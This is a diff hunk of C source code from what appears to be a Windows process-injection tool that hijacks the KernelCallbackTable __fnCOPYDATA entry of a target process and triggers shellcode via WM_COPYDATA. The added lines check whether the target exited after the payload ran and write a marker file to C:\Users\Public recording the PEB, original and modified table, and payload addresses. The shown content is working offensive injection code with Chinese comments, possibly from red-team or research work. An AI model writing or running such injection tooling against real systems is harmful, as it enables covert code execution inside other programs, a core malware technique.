@@ -329,6 +329,60 @@ BOOL KernelCallbackTableInject(const char* targetProcess, PVOID payload, DWORD p
     printf("[+] Injection completed successfully!\n");
     printf("===================================================================\n");
 
+    // 等待并验证注入效果
+    printf("\n[*] Waiting 5 seconds to verify injection...\n");
+    Sleep(5000);
+
+    DWORD exitCode = 0;
+    if (GetExitCodeProcess(pi.hProcess, &exitCode)) {
+        if (exitCode != STILL_ACTIVE) {
+            printf("[+] Target process exited (Exit code: %u) - Payload executed!\n", exitCode);
+
+            // 创建验证文件
+            HANDLE hMarker = CreateFileA(
+                "C:\\Users\\Public\\kernel_callback_verified.txt",
+                GENERIC_WRITE,
+                0,
+                NULL,
+                CREATE_ALWAYS,
+                FILE_ATTRIBUTE_NORMAL,
+                NULL
+            );
+
+            if (hMarker != INVALID_HANDLE_VALUE) {
+                char msg[1024];
+                snprintf(msg, sizeof(msg),
+                    "Kernel Callback Table Injection Verified!\n"
+                    "Target Process: %s\n"
+                    "Process PID: %u\n"
+                    "PEB Address: 0x%p\n"
+                    "Original KernelCallbackTable: 0x%p\n"
+                    "Modified KernelCallbackTable: 0x%p\n"
+                    "Payload Address: 0x%p\n"
+                    "Payload Size: %u bytes\n"
+                    "Exit Code: %u\n"
+                    "Status: Process exited - shellcode executed!\n"
+                    "Technique: Hijacked KernelCallbackTable.__fnCOPYDATA\n"
+                    "Trigger: SendMessage(WM_COPYDATA)\n",
+                    targetProcess,
+                    pi.dwProcessId,
+                    pebAddress,
+                    kernelCallbackTableAddr,
+                    remoteTable,
+                    remotePayload,
+                    payloadSize,
+                    exitCode
+                );
+                DWORD written;
+                WriteFile(hMarker, msg, strlen(msg), &written, NULL);
+                CloseHandle(hMarker);
+                printf("[+] Verification file created: C:\\Users\\Public\\kernel_callback_verified.txt\n");
+            }
+        } else {
+            printf("[!] Target process still running (PID: %u)\n", pi.dwProcessId);
+        }
+    }
+
     success = TRUE;
 
 CLEANUP:
